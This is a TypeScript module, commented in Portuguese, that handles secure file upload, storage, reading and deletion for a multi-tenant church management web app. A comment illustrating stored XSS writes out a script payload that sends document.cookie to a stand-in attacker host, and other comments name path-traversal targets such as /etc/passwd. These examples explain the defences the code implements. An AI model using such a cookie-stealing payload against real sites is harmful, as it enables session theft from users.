import { createHash, randomBytes } from "node:crypto";
import { mkdir, readFile, unlink, writeFile } from "node:fs/promises";
import path from "node:path";
import { env } from "@/lib/env";
import { tenantDb } from "@/lib/db/tenant-client";
import { MIMES_PERMITIDOS, MIME_PARA_EXTENSAO } from "@/lib/storage/urls";

/**
 * =============================================================================
 * ARMAZENAMENTO DE ARQUIVOS
 * =============================================================================
 *
 * Upload é a superfície de ataque mais generosa de qualquer sistema web: é o
 * único ponto em que um usuário entrega BYTES ARBITRÁRIOS que o servidor vai
 * gravar em disco e mais tarde devolver para um navegador. Três coisas podem
 * dar errado, e as três já derrubaram sistemas reais:
 *
 *   1. O conteúdo não é o que diz ser  -> XSS armazenado / execução
 *   2. O caminho não é onde deveria    -> path traversal / sobrescrita
 *   3. O volume não tem teto           -> disco cheio, VPS inteira fora do ar
 *
 * Este módulo trata das três. A quarta defesa (cabeçalhos de resposta) fica em
 * src/app/api/arquivos/[id]/route.ts, porque é lá que os bytes voltam.
 */

// -----------------------------------------------------------------------------
// 1. Detecção de tipo por conteúdo
// -----------------------------------------------------------------------------

/**
 * Descobre o MIME real lendo os primeiros bytes do arquivo.
 *
 * POR QUE NÃO CONFIAR NO `Content-Type` NEM NA EXTENSÃO
 *
 * Os dois são campos de texto escolhidos pelo cliente. O cenário concreto:
 *
 *   Um líder de célula abre o formulário de foto de perfil. Em vez de usar o
 *   seletor de arquivos, ele monta a requisição na mão (curl, DevTools, ou
 *   qualquer script de 5 linhas) e envia:
 *
 *       Content-Type: image/png
 *       filename: "foto.png"
 *       corpo: <html><script>fetch('https://ataque/?c='+document.cookie)</script>
 *
 *   Se acreditarmos no cabeçalho, gravamos esse HTML como "foto.png". Quando o
 *   navegador de um PASTOR abrir a foto na ficha do membro, o Chrome faz
 *   sniffing do conteúdo, vê que é HTML, e executa o script — na NOSSA origem,
 *   com os cookies da NOSSA sessão. O atacante não precisou de nenhuma falha
 *   de código: ele só precisou que confiássemos num campo que ele controla.
 *
 * Magic bytes são o conteúdo. Não dá para mentir sobre eles sem deixar de ser
 * o formato que se afirma ser.
 *
 * (Isto é a primeira barreira, não a única: mesmo com o MIME correto, a rota de
 * entrega ainda manda `nosniff`, `Content-Disposition` e CSP sandbox. Defesa em
 * profundidade — magic bytes podem ser burlados por arquivos poliglotas, que
 * são um GIF válido E um HTML válido ao mesmo tempo.)
 *
 * @returns o MIME detectado, ou null se o conteúdo não for de nenhum formato
 *          que conhecemos.
 */
export function detectarMimePorMagicBytes(buffer: Buffer): string | null {
  // Menos de 16 bytes não é imagem nem PDF de verdade. Também protege todos os
  // acessos por índice abaixo.
  if (buffer.length < 16) return null;

  // ---- JPEG: SOI (FF D8) seguido de um marcador (FF)
  if (buffer[0] === 0xff && buffer[1] === 0xd8 && buffer[2] === 0xff) {
    return "image/jpeg";
  }

  // ---- PNG: assinatura de 8 bytes.
  // Os bytes \r\n e \x1a existem justamente para detectar transferência
  // corrompida por FTP em modo texto — herança útil: é uma assinatura difícil
  // de produzir por acidente.
  if (comeca(buffer, [0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])) {
    return "image/png";
  }

  // ---- GIF: "GIF87a" ou "GIF89a"
  if (buffer.subarray(0, 6).toString("latin1") === "GIF87a" ||
      buffer.subarray(0, 6).toString("latin1") === "GIF89a") {
    return "image/gif";
  }

  // ---- WEBP: contêiner RIFF com o form type "WEBP" no offset 8.
  // Checar só "RIFF" não basta: WAV e AVI também são RIFF.
  if (
    buffer.length >= 12 &&
    buffer.subarray(0, 4).toString("latin1") === "RIFF" &&
    buffer.subarray(8, 12).toString("latin1") === "WEBP"
  ) {
    return "image/webp";
  }

  // ---- AVIF: ISO-BMFF (mesma família do MP4/HEIC).
  // Estrutura: [4 bytes tamanho da box][ "ftyp" ][ marca principal ][versão]
  //            [ marcas compatíveis... ]
  // Verificamos a marca principal E as compatíveis, porque encoders diferentes
  // gravam "avif" em posições diferentes. HEIC (marca "heic") cai fora de
  // propósito: não está na allowlist.
  if (buffer.length >= 12 && buffer.subarray(4, 8).toString("latin1") === "ftyp") {
    const tamanhoBox = buffer.readUInt32BE(0);
    // Teto no tamanho da box para não varrer o arquivo inteiro atrás de marcas.
    const fim = Math.min(buffer.length, Math.max(16, Math.min(tamanhoBox, 128)));
    const marcas = buffer.subarray(8, fim).toString("latin1");
    if (/avif|avis/.test(marcas)) return "image/avif";
  }

  // ---- PDF: "%PDF-" no início.
  // A especificação permite lixo antes do header, e leitores toleram isso —
  // nós não. Um PDF que começa com HTML é exatamente o arquivo poliglota que
  // queremos recusar.
  if (buffer.subarray(0, 5).toString("latin1") === "%PDF-") {
    return "application/pdf";
  }

  /**
   * SVG NÃO É DETECTÁVEL AQUI — E ISSO É DE PROPÓSITO.
   *
   * SVG é XML, não tem magic bytes. Mas o motivo real de estar fora da
   * allowlist é outro: SVG é um documento ATIVO. Ele aceita `<script>`,
   * `<foreignObject>` com HTML dentro, `onload=` em qualquer elemento e
   * `xlink:href="javascript:"`. Servido como `image/svg+xml` a partir da nossa
   * origem, um SVG enviado por um usuário roda JavaScript com os cookies do
   * domínio da igreja — é XSS armazenado com um arquivo que parece uma imagem
   * inofensiva.
   *
   * Sanitizar SVG (DOMPurify e afins) é possível, mas é uma corrida de gato e
   * rato com bypasses novos a cada ano. Para uma logo de igreja, o ganho não
   * compensa: se o cliente tiver o logo em vetor, convertemos para PNG nós
   * mesmos, fora do caminho de upload.
   */

  return null;
}

function comeca(buffer: Buffer, assinatura: number[]): boolean {
  if (buffer.length < assinatura.length) return false;
  for (let i = 0; i < assinatura.length; i++) {
    if (buffer[i] !== assinatura[i]) return false;
  }
  return true;
}

// -----------------------------------------------------------------------------
// Erros
// -----------------------------------------------------------------------------

/**
 * Erros deste módulo carregam o status HTTP que lhes cabe, para que a rota
 * traduza sem precisar reconhecer cada classe uma a uma. As mensagens são
 * escritas para o usuário final — nenhuma delas revela caminho de disco,
 * nome de coluna ou detalhe da infraestrutura.
 */
export class ErroDeUpload extends Error {
  constructor(
    mensagem: string,
    public readonly status: 400 | 413 | 415,
  ) {
    super(mensagem);
    this.name = "ErroDeUpload";
  }
}

// -----------------------------------------------------------------------------
// 2. Gravação
// -----------------------------------------------------------------------------

/** Formato de CUID — o mesmo do Prisma. Validado antes de virar componente de caminho. */
const FORMATO_ID = /^c[a-z0-9]{20,30}$/;

export interface EntradaSalvarArquivo {
  /** SEMPRE o tenant resolvido pelo hostname. Nunca um valor vindo do cliente. */
  tenantId: string;
  /** Nome que o usuário enviou. Guardado só para exibição e download. */
  nomeOriginal: string;
  buffer: Buffer;
  /** true = servível sem sessão (logo do site). false = exige membership. */
  publico: boolean;
  enviadoPorId?: string | null;
}

export interface ArquivoSalvo {
  id: string;
  nomeOriginal: string;
  mimeType: string;
  tamanhoBytes: number;
  sha256: string;
  publico: boolean;
  largura: number | null;
  altura: number | null;
  /** true quando o conteúdo já existia no tenant e foi reaproveitado. */
  deduplicado: boolean;
}

/**
 * Valida, grava em disco e registra um arquivo do tenant.
 *
 * Ordem das checagens: da mais barata para a mais cara. Rejeitar por tamanho
 * antes de calcular SHA-256 de 5 MB é o que impede que uma enxurrada de
 * uploads inválidos vire consumo de CPU.
 */
export async function salvarArquivo(entrada: EntradaSalvarArquivo): Promise<ArquivoSalvo> {
  const { tenantId, buffer, publico } = entrada;

  // O tenantId vira componente de CAMINHO. Mesmo vindo de fonte confiável
  // (hostname -> banco), validamos o formato: é a diferença entre uma
  // regressão futura virar bug e virar escrita fora do diretório de storage.
  if (!FORMATO_ID.test(tenantId)) {
    throw new ErroDeUpload("Não foi possível identificar a igreja desta requisição.", 400);
  }

  // ---- Tamanho
  if (buffer.length === 0) {
    throw new ErroDeUpload("O arquivo enviado está vazio.", 400);
  }
  if (buffer.length > env.MAX_UPLOAD_BYTES) {
    throw new ErroDeUpload(
      `Arquivo muito grande. O limite é ${formatarMb(env.MAX_UPLOAD_BYTES)}.`,
      413,
    );
  }

  // ---- Tipo real, pelo conteúdo
  const mimeType = detectarMimePorMagicBytes(buffer);
  if (!mimeType || !MIMES_PERMITIDOS.has(mimeType)) {
    throw new ErroDeUpload(
      "Formato não aceito. Envie uma imagem (JPG, PNG, WEBP, AVIF ou GIF) ou um PDF.",
      415,
    );
  }

  const extensao = MIME_PARA_EXTENSAO[mimeType];
  if (!extensao) {
    // Só acontece se alguém acrescentar um MIME à allowlist sem mapear a
    // extensão. Falhar fechado é melhor que gravar um arquivo sem extensão.
    throw new ErroDeUpload("Formato não aceito.", 415);
  }

  const sha256 = createHash("sha256").update(buffer).digest("hex");
  const db = tenantDb(tenantId);

  /**
   * DEDUPLICAÇÃO POR SHA-256, DENTRO DO TENANT.
   *
   * A mesma logo enviada de novo a cada edição do site não deve virar 40
   * cópias no disco. A busca já vem escopada pelo tenantDb, então o hash de
   * uma igreja jamais casa com o arquivo de outra — o que também evita um
   * canal lateral: se deduplicássemos globalmente, o tempo de resposta do
   * upload revelaria se OUTRA igreja já tem aquele arquivo exato.
   *
   * O `publico` entra na chave de propósito. Sem ele, alguém que reenviasse um
   * PDF privado marcando "público" receberia de volta o registro privado (ruim,
   * mas inofensivo) — e, no sentido inverso, um reenvio marcado como privado
   * devolveria um registro PÚBLICO, deixando acessível sem sessão um conteúdo
   * que o usuário pediu para restringir.
   */
  const existente = await db.arquivo.findFirst({
    where: { sha256, publico },
    select: {
      id: true, nomeOriginal: true, mimeType: true, tamanhoBytes: true,
      sha256: true, publico: true, largura: true, altura: true,
    },
  });

  if (existente) {
    return { ...existente, deduplicado: true };
  }

  // ---- Nome no disco: ALEATÓRIO, nunca derivado do que o usuário enviou.
  //
  // Derivar do nome original traria de volta todos os problemas de uma vez:
  // "../../etc/cron.d/algo" escaparia do diretório; "logo.php" poderia ser
  // executado por um servidor mal configurado; e dois uploads chamados
  // "foto.jpg" colidiriam. 16 bytes aleatórios não têm nenhum desses.
  const nomeArmazenado = `${randomBytes(16).toString("hex")}.${extensao}`;

  // Fragmentação em dois níveis: um diretório com 100.000 arquivos degrada
  // listagem e backup em ext4. Dois caracteres hex dão 256 pastas por igreja.
  const fragmento = nomeArmazenado.slice(0, 2);
  const caminhoRelativo = path.posix.join(tenantId, fragmento, nomeArmazenado);

  const raizDoTenant = path.resolve(env.STORAGE_DIR, tenantId);
  const caminhoAbsoluto = path.resolve(env.STORAGE_DIR, caminhoRelativo);

  /**
   * DEFESA CONTRA PATH TRAVERSAL — a checagem que não pode faltar.
   *
   * Neste ponto o nome é aleatório e o tenantId já passou por regex, então em
   * teoria nada pode escapar. A verificação existe porque "em teoria" é
   * exatamente o que falha:
   *
   *   - alguém refatora e passa a usar o nome original em algum sufixo;
   *   - alguém acrescenta uma variante de `salvarArquivo` para importação em
   *     massa e monta o caminho a partir do ZIP recebido;
   *   - o formato do CUID muda numa versão futura do Prisma.
   *
   * `path.resolve` normaliza `..`, `.`, barras duplicadas e separadores do
   * sistema operacional. Comparar o resultado com a raiz do tenant é a única
   * forma confiável de afirmar "este caminho está dentro". Comparar STRINGS
   * antes de resolver não funciona: "storage/tenantA/../tenantB/x" começa com
   * "storage/tenantA" e ainda assim aponta para outra igreja.
   *
   * O separador no final é obrigatório: sem ele, "/storage/tenantA-malicioso"
   * passaria no `startsWith("/storage/tenantA")`.
   */
  if (
    caminhoAbsoluto !== raizDoTenant &&
    !caminhoAbsoluto.startsWith(raizDoTenant + path.sep)
  ) {
    throw new ErroDeUpload("Não foi possível salvar o arquivo.", 400);
  }

  await mkdir(path.dirname(caminhoAbsoluto), { recursive: true, mode: 0o750 });

  // `wx` falha se o arquivo já existir. Com 128 bits de aleatoriedade a
  // colisão é impossível na prática — então, se acontecer, é sinal de que algo
  // está muito errado (RNG quebrado, nome previsível) e queremos o erro alto,
  // não uma sobrescrita silenciosa.
  //
  // mode 0o640: o processo do app lê e escreve; o grupo lê (backup); o resto do
  // sistema não vê nada.
  await writeFile(caminhoAbsoluto, buffer, { flag: "wx", mode: 0o640 });

  const dimensoes = dimensoesDeImagem(buffer, mimeType);

  try {
    const registro = await db.arquivo.create({
      data: {
        tenantId,
        nomeOriginal: sanitizarNomeOriginal(entrada.nomeOriginal),
        nomeArmazenado,
        caminho: caminhoRelativo,
        mimeType,
        tamanhoBytes: buffer.length,
        sha256,
        largura: dimensoes.largura,
        altura: dimensoes.altura,
        publico,
        enviadoPorId: entrada.enviadoPorId ?? null,
      },
      select: {
        id: true, nomeOriginal: true, mimeType: true, tamanhoBytes: true,
        sha256: true, publico: true, largura: true, altura: true,
      },
    });

    return { ...registro, deduplicado: false };
  } catch (erro) {
    // O byte já está no disco e o registro falhou: sem a remoção, o arquivo
    // ficaria ocupando a cota da igreja sem aparecer em lugar nenhum — e
    // portanto sem forma de ser apagado pela interface.
    await unlink(caminhoAbsoluto).catch(() => {});
    throw erro;
  }
}

// -----------------------------------------------------------------------------
// 3. Leitura
// -----------------------------------------------------------------------------

export interface MetadadosArquivo {
  id: string;
  nomeOriginal: string;
  caminho: string;
  mimeType: string;
  tamanhoBytes: number;
  sha256: string;
  publico: boolean;
  criadoEm: Date;
}

/**
 * Metadados do arquivo, SEM ler o conteúdo do disco.
 *
 * Separado de `lerArquivo` porque a rota de entrega precisa decidir duas
 * coisas antes de tocar o disco: se quem pede tem direito de ver, e se o ETag
 * do cliente já está atualizado. Num painel com 30 imagens, isso é a diferença
 * entre 30 leituras de disco por navegação e zero.
 *
 * Retorna null quando o arquivo não existe NESTE tenant — o que inclui o caso
 * "existe, mas é de outra igreja". Do lado de fora, os dois são
 * indistinguíveis, que é exatamente o objetivo.
 */
export async function metadadosArquivo(
  tenantId: string,
  arquivoId: string,
): Promise<MetadadosArquivo | null> {
  if (!FORMATO_ID.test(arquivoId)) return null;

  return tenantDb(tenantId).arquivo.findFirst({
    where: { id: arquivoId },
    select: {
      id: true, nomeOriginal: true, caminho: true, mimeType: true,
      tamanhoBytes: true, sha256: true, publico: true, criadoEm: true,
    },
  });
}

export interface ArquivoLido extends MetadadosArquivo {
  conteudo: Buffer;
}

/**
 * Metadados + bytes.
 *
 * O caminho gravado no banco é revalidado contra a raiz do tenant antes de
 * abrir o arquivo. Parece paranoia — o valor foi escrito por nós. Mas a coluna
 * `caminho` é um TEXTO no banco: quem conseguir escrever nela (SQL injection
 * em outra rota, backup restaurado de forma errada, script de migração com
 * bug) transformaria esta função num leitor arbitrário de arquivos do
 * servidor, com `/etc/passwd` a um UPDATE de distância. A revalidação torna
 * esse pulo impossível.
 */
export async function lerArquivo(
  tenantId: string,
  arquivoId: string,
): Promise<ArquivoLido | null> {
  const meta = await metadadosArquivo(tenantId, arquivoId);
  if (!meta) return null;

  const conteudo = await lerConteudo(tenantId, meta.caminho);
  if (!conteudo) return null;

  return { ...meta, conteudo };
}

/** Lê os bytes de um caminho já validado. Retorna null se o arquivo sumiu. */
export async function lerConteudo(
  tenantId: string,
  caminhoRelativo: string,
): Promise<Buffer | null> {
  const raizDoTenant = path.resolve(env.STORAGE_DIR, tenantId);
  const absoluto = path.resolve(env.STORAGE_DIR, caminhoRelativo);

  if (absoluto !== raizDoTenant && !absoluto.startsWith(raizDoTenant + path.sep)) {
    return null;
  }

  try {
    return await readFile(absoluto);
  } catch {
    // Arquivo apagado por fora do sistema, disco remontado, permissão trocada.
    // Para o chamador é sempre "não encontrado" — nenhum detalhe do erro de
    // sistema de arquivos chega ao cliente.
    return null;
  }
}

// -----------------------------------------------------------------------------
// 4. Exclusão
// -----------------------------------------------------------------------------

/**
 * Remove o registro e o byte do disco.
 *
 * O registro sai PRIMEIRO. Se a ordem fosse inversa e o DELETE falhasse,
 * ficaria uma linha no banco apontando para um arquivo inexistente — e a
 * interface mostraria uma imagem quebrada que ninguém consegue remover.
 * Falhar ao apagar do disco, por outro lado, deixa apenas um órfão invisível,
 * que a rotina de manutenção recolhe depois.
 *
 * @returns false quando o arquivo não existe neste tenant.
 */
export async function excluirArquivo(tenantId: string, arquivoId: string): Promise<boolean> {
  const meta = await metadadosArquivo(tenantId, arquivoId);
  if (!meta) return false;

  // O delete passa pelo cliente escopado, que confere a propriedade de novo
  // antes de executar.
  await tenantDb(tenantId).arquivo.delete({ where: { id: meta.id } });

  const raizDoTenant = path.resolve(env.STORAGE_DIR, tenantId);
  const absoluto = path.resolve(env.STORAGE_DIR, meta.caminho);
  if (absoluto === raizDoTenant || absoluto.startsWith(raizDoTenant + path.sep)) {
    await unlink(absoluto).catch(() => {
      /* órfão em disco é tolerável; registro removido é o que importa */
    });
  }

  return true;
}

// -----------------------------------------------------------------------------
// 5. Cota
// -----------------------------------------------------------------------------

/**
 * Soma o armazenamento já consumido pela igreja.
 *
 * Somar a coluna é mais confiável que medir o diretório: o banco é a fonte da
 * verdade sobre o que a igreja realmente possui, e arquivos órfãos (de uma
 * falha no meio de um upload) não devem ser cobrados dela.
 */
export async function bytesUsadosPorTenant(tenantId: string): Promise<number> {
  const soma = await tenantDb(tenantId).arquivo.aggregate({
    _sum: { tamanhoBytes: true },
  });
  return soma._sum.tamanhoBytes ?? 0;
}

// -----------------------------------------------------------------------------
// Auxiliares
// -----------------------------------------------------------------------------

/**
 * Limpa o nome enviado pelo usuário antes de guardá-lo.
 *
 * Este nome NÃO define onde o arquivo é gravado — só aparece na interface e no
 * `Content-Disposition` do download. Ainda assim removemos caracteres de
 * controle (incluindo CR e LF, que permitiriam injeção de cabeçalho HTTP na
 * hora do download) e sequências de caminho, porque um dia alguém vai
 * renderizar este campo em algum lugar que não previmos.
 */
function sanitizarNomeOriginal(nome: string): string {
  const limpo = nome
    .normalize("NFC")
    .replace(/[\u0000-\u001F\u007F]/g, "")
    .replace(/[\\/]/g, "-")
    .replace(/\.{2,}/g, ".")
    .trim()
    .slice(0, 200);

  return limpo || "arquivo";
}

function formatarMb(bytes: number): string {
  const mb = bytes / (1024 * 1024);
  return `${mb >= 10 ? Math.round(mb) : mb.toFixed(1).replace(".", ",")} MB`;
}

/**
 * Largura e altura, quando dá para extrair barato do próprio cabeçalho.
 *
 * Best-effort de propósito: serve para o `<img>` reservar espaço e evitar
 * salto de layout, não para validar nada. Nunca lança — um cabeçalho
 * malformado devolve `{ null, null }` e o upload segue normalmente. Todos os
 * laços têm teto, porque um arquivo construído de propósito não pode
 * transformar esta função em varredura de megabytes.
 */
function dimensoesDeImagem(
  buffer: Buffer,
  mimeType: string,
): { largura: number | null; altura: number | null } {
  const vazio = { largura: null, altura: null };

  try {
    if (mimeType === "image/png" && buffer.length >= 24) {
      // IHDR é sempre a primeira chunk: largura e altura em big-endian.
      return { largura: buffer.readUInt32BE(16), altura: buffer.readUInt32BE(20) };
    }

    if (mimeType === "image/gif" && buffer.length >= 10) {
      // Logical Screen Descriptor, little-endian.
      return { largura: buffer.readUInt16LE(6), altura: buffer.readUInt16LE(8) };
    }

    if (mimeType === "image/jpeg") {
      // Percorre os segmentos até achar um Start Of Frame (SOFn).
      let offset = 2;
      // Teto de 256 segmentos: JPEG legítimo tem dezenas, não milhares.
      for (let i = 0; i < 256 && offset + 9 < buffer.length; i++) {
        if (buffer[offset] !== 0xff) break;

        const marcador = buffer[offset + 1]!;
        const tamanho = buffer.readUInt16BE(offset + 2);
        if (tamanho < 2) break;

        // SOF0..SOF15, exceto DHT (C4), DAC (C8) e RSTn (D0-D7).
        const ehSof =
          marcador >= 0xc0 && marcador <= 0xcf &&
          marcador !== 0xc4 && marcador !== 0xc8 && marcador !== 0xcc;

        if (ehSof) {
          return { altura: buffer.readUInt16BE(offset + 5), largura: buffer.readUInt16BE(offset + 7) };
        }

        offset += 2 + tamanho;
      }
      return vazio;
    }

    // WEBP e AVIF: o cabeçalho varia por modo de codificação (lossy, lossless,
    // com alpha) e a extração correta exigiria um parser de verdade. Não vale
    // a complexidade — o navegador descobre sozinho ao carregar.
    return vazio;
  } catch {
    return vazio;
  }
}
